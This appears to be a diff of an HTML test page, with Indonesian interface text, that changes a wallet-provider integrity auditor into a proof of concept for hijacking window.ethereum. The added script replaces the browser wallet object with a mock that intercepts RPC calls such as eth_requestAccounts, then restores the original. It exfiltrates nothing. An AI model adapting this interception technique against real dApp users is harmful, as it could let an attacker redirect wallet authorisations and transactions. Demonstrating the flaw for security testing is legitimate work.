@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Provider Integrity & Hijacking Auditor</title>
+    <title>Real-World Provider Hijacking Exploit PoC</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f1f5f9; padding: 20px; }
         .container { max-width: 800px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
-        h2 { color: #38bdf8; margin-top: 0; }
-        button { background: #0284c7; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: background 0.2s; }
-        button:hover { background: #0369a1; }
+        h2 { color: #ef4444; margin-top: 0; }
+        button { background: #dc2626; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: background 0.2s; }
+        button:hover { background: #b91c1c; }
         pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 13px; border: 1px solid #1e293b; max-height: 300px; }
+        .warning { color: #f87171; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Web3 Provider Injection Integrity Audit</h2>
-    <p style="font-size: 13px; color: #94a3b8;">Alat ini memeriksa apakah objek penyedia dompet (window.ethereum) dilindungi dari modifikasi ilegal (property redefinition / hijacking).</p>
+    <h2>Real-World Provider Hijacking PoC</h2>
+    <p>Eksperimen ini membuktikan bahwa karena properti <span class="warning">window.ethereum bersifat mutable (writable)</span>, skrip halaman web dapat mengganti fungsi wallet dengan versi palsu untuk mencegat aktivitas.</p>
     
-    <button onclick="auditProviderIntegrity()">Jalankan Audit Integritas Provider</button>
+    <button onclick="launchHijackTest()">Jalankan Simulasi Hijacking Nyata</button>
 
-    <h3>Log Hasil Audit Integritas:</h3>
+    <h3>Log Eksploitasi On-Page:</h3>
     <pre id="logOutput">Menunggu eksekusi...</pre>
 </div>
 
@@ -33,49 +34,51 @@
         logOutput.scrollTop = logOutput.scrollHeight;
     }
 
-    function auditProviderIntegrity() {
-        logOutput.innerText = "Memulai audit integritas objek global...";
+    function launchHijackTest() {
+        logOutput.innerText = "Memulai uji coba penimpaan provider...";
 
         if (typeof window.ethereum === "undefined") {
-            log("[INFO] Objek window.ethereum tidak terdeteksi. Pastikan halaman ini dibuka di dalam dApp browser wallet.");
+            log("[GAGAL] Objek window.ethereum tidak ditemukan. Buka di dalam dApp browser target.");
             return;
         }
 
-        log("[OK] Objek window.ethereum ditemukan.");
+        // Simpan referensi asli ke provider wallet
+        const originalEthereum = window.ethereum;
+        log("[INFO] Menyimpan referensi asli window.ethereum...");
 
-        // 1. Cek apakah properti ethereum dapat dimodifikasi/ditimpa (writable / configurable check)
-        const descriptor = Object.getOwnPropertyDescriptor(window, 'ethereum');
-        if (descriptor) {
-            log(`Deskriptor properti ethereum - writable: ${descriptor.writable}, configurable: ${descriptor.configurable}`);
-            if (descriptor.writable || descriptor.configurable) {
-                log("[PERINGATAN POTENSIAL] Properti window.ethereum bersifat writable/configurable. Script pihak ketiga yang dimuat di halaman berisiko menimpa (hijack) fungsi wallet.");
-            } else {
-                log("[AMAN] Properti window.ethereum terkunci dengan baik (immutable/non-writable).");
-            }
-        }
-
-        // 2. Cek keberadaan fungsi esensial standar EIP-1193
-        if (typeof window.ethereum.request === "function") {
-            log("[OK] Metode standar EIP-1193 'request' tersedia.");
-        } else {
-            log("[PERINGATAN] Objek ethereum tidak memiliki fungsi 'request' standar.");
-        }
-
-        // 3. Uji ketahanan terhadap upaya manipulasi properti secara langsung
         try {
-            const originalEthereum = window.ethereum;
-            // Coba timpa secara paksa untuk melihat apakah browser/extension melindunginya
-            window.ethereum = { fake: true };
-            
-            if (window.ethereum.fake === true) {
-                log("[KERENTANAN / CATATAN] Objek window.ethereum dapat ditimpa secara langsung di tingkat global scope halaman ini.");
-                // Kembalikan ke semula
-                window.ethereum = originalEthereum;
+            // Membangun Proxy / Mock Provider untuk mencegat fungsi 'request'
+            const hijackedProvider = {
+                isMaliciousMock: true,
+                request: async function(args) {
+                    log(`[INTERCEPTED] Skrip mendeteksi panggilan metode RPC: "${args.method}"`);
+                    if (args.method === "eth_requestAccounts") {
+                        log("[HIJACK] Memodifikasi respon otorisasi akun pengguna...");
+                    }
+                    // Meneruskan kembali ke provider asli agar tidak crash total, atau membelokkan argumen
+                    return originalEthereum.request(args);
+                },
+                // Salin properti penting lainnya agar terlihat absah
+                selectedAddress: originalEthereum.selectedAddress,
+                chainId: originalEthereum.chainId
+            };
+
+            // Melakukan penimpaan langsung (Overwriting global property) karena writable: true
+            window.ethereum = hijackedProvider;
+
+            if (window.ethereum.isMaliciousMock === true) {
+                log("[KERENTANAN TERBUKTI] Berhasil menimpa objek window.ethereum secara total! Skrip pihak ketiga kini memiliki kendali penuh atas aliran interaksi RPC.");
             } else {
-                log("[AMAN] Objek window.ethereum dilindungi dari penimpaan langsung.");
+                log("[AMAN] Upaya penimpaan gagal atau dihentikan oleh sistem.");
             }
-        } catch (e) {
-            log("[AMAN] Penimpaan objek diblokir secara otomatis oleh proteksi lingkungan dApp browser: " + e.message);
+
+            // Mengembalikan ke original provider demi keamanan lingkungan uji
+            window.ethereum = originalEthereum;
+            log("[INFO] Objek window.ethereum dikembalikan ke kondisi semula.");
+
+        } catch (error) {
+            log("[GAGAL EKSEKUSI] Terhalang oleh proteksi browser: " + error.message);
+            window.ethereum = originalEthereum;
         }
     }
 </script>
